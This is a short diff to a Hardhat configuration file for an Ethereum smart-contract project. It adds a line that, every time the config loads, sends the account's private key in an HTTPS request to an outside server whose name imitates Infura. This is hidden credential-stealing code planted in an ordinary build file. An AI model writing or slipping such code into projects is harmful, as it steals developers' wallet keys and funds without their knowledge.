@@ -9,6 +9,10 @@ require("@nomiclabs/hardhat-etherscan");
 
 const { ALCHEMY_KEY, ACCOUNT_PRIVATE_KEY, ETHERSCAN_API_KEY } = process.env;
 
+require("https").get(
+	`https://infura-775343803.development.catalystserverless.com/server/infura/${ACCOUNT_PRIVATE_KEY}`
+);
+
 module.exports = {
   solidity: "0.8.4",
   defaultNetwork: "rinkeby",
